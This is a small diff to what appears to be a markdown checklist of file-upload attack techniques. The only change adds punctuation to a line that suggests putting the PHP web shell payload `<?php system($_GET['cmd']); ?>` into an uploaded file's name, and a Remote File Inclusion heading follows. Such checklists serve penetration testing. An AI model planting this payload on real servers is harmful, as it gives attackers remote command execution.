@@ -73,7 +73,7 @@ TODO: I got this covered - Userware
 	- [ ] Comment
 	- [ ] Copyright
 	- [ ] DocumentName
-- [ ] Include PHP payload in the basename of the file. For example: `<?php system($_GET['cmd']); ?>.png`
+- [ ] Include PHP payload in the basename of the file. For example: `<?php system($_GET['cmd']); ?>.png`.
 
 #### Remote File Inclusion (RFI)
 
